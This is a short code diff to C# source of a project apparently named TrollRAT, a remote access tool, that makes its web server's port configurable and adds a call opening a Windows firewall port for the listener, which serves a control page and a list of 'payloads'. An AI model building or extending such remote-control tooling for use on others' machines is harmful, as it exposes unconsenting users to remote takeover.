@@ -11,11 +11,17 @@ namespace TrollRAT
     {
         private byte[] site;
 
+        private int port;
+        public int Port => port;
+
         private List<Payload> payloads = new List<Payload>();
         public List<Payload> Payloads => payloads;
 
-        public WebServer()
+        public WebServer(int port)
         {
+            this.port = port;
+            Firewall.openPort("TrollRAT", port, NetFwTypeLib.NET_FW_IP_PROTOCOL_.NET_FW_IP_PROTOCOL_TCP);
+
             var assembly = Assembly.GetExecutingAssembly();
             using (var stream = assembly.GetManifestResourceStream("TrollRAT.client.html"))
             {
@@ -27,7 +33,7 @@ namespace TrollRAT
         public void run()
         {
             HttpListener listener = new HttpListener();
-            listener.Prefixes.Add("http://*:1337/");
+            listener.Prefixes.Add(String.Format("http://*:{0}/", port));
             listener.Start();
             
             while (listener.IsListening)
